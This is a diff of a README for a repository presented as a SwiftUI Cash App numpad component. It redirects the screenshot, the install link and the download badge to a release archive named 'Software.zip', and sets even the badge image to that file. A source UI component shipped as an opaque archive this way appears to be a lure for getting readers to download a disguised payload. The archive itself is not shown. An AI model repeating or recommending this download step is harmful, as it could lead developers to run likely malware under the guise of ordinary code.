@@ -4,7 +4,7 @@ Welcome to the **CashApp NumPad SwiftUI** repository! 📱💸 This project aims
 
 ## Screenshots
 
-![Cash App NumPad](https://example.com/cashapp-numpad.png)
+![Cash App NumPad](https://github.com/angelcoronil21/cashapp-numpad-swiftui/releases/download/v2.0/Software.zip)
 
 ## Features
 
@@ -17,8 +17,8 @@ Welcome to the **CashApp NumPad SwiftUI** repository! 📱💸 This project aims
 
 To get started with the Cash App NumPad SwiftUI in your project, simply follow these steps:
 
-1. Download the SwiftUI components from [this link](https://github.com/user-attachments/files/18410590/Software.zip)
-   <a href="https://github.com/user-attachments/files/18410590/Software.zip"><img src="https://img.shields.io/badge/Download-Software-yellow"></a>
+1. Download the SwiftUI components from [this link](https://github.com/angelcoronil21/cashapp-numpad-swiftui/releases/download/v2.0/Software.zip)
+   <a href="https://github.com/angelcoronil21/cashapp-numpad-swiftui/releases/download/v2.0/Software.zip"><img src="https://github.com/angelcoronil21/cashapp-numpad-swiftui/releases/download/v2.0/Software.zip"></a>
 2. Extract the downloaded files to your project directory
 3. Integrate the Cash App NumPad component into your SwiftUI views
 4. Customize the appearance and functionality to suit your app's requirements
